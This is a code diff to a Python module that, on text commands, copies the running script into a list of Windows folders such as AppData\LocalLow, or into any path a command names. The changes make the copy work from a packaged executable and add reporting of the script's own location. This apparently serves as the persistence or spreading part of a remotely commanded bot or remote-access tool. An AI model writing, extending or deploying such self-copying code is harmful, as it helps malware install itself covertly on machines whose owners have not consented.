@@ -1,5 +1,6 @@
 import os
 import shutil
+import sys
 
 WIN8 = [
     r"C:\Users\<username>\AppData\LocalLow",
@@ -30,17 +31,25 @@ def get_dirs(message):
     except Exception as e: return f"Error in get_dirs(): {e}"
 
 def copy_to_dir(dir):
-    shutil.copy2(__file__, dir)
+    script_path = os.path.abspath(sys.argv[0])
+    shutil.copy2(script_path, dir)
     return f"Successfully copied script to {dir}."
+
+def get_script_path(_):
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+        return f"Current script path: {script_path}"
+    except Exception as e: return f"Error in get_script_path(): {e}"
 
 def copy_default(message):
     try:
         machine = message.split(" ")[1]
         if machine == "8" or machine == "server":
+            rstring = ""
             for target in WIN8:
                 try:
-                    copy_to_dir(target)
-                except: pass
+                    rstring += copy_to_dir(target) + "\n"
+                except Exception as e: rstring += f"Error copying to {target}: {e}"
             return f"Successful Copy"
         elif machine == "xp":
             for target in WINXP:
@@ -51,7 +60,8 @@ def copy_default(message):
     except Exception as e: return f"Error in copy_default(): {e}"
 
 def copy_dir_msg(message):
+    print(message)
     try:
-        target = message.split(" ")[1]
+        target = message.split(" ", 1)[1]
         return copy_to_dir(target)
     except Exception as e: return f"Error in copy_dir_msg(): {e}"
